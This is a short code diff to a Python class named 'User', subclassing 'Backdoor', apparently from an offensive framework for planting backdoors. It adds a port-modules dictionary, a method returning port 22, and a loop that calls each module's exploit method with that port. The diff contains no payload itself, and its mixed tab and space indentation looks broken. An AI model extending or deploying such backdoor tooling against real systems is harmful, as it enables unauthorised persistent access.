@@ -13,7 +13,11 @@ class User(Backdoor):
 		}
         self.allow_modules = True
         self.enabled_modules = {}
-        self.modules = {}
+        self.portModules = {}
+	self.modules = {}
+
+    def get_port(self):
+        return 22
 
     def get_command(self):
 	user=self.get_value("name")
@@ -29,3 +33,7 @@ class User(Backdoor):
 	for mod in self.modules.keys():
 	    print(INFO + "Attempting to execute " + mod.name + " module...")
 	    mod.exploit(self.get_command())
+	for mod in self.portModules.keys():
+            print(INFO + "Attempting to execute " + mod.name + " module...")
+            mod.exploit(self.get_port())
+
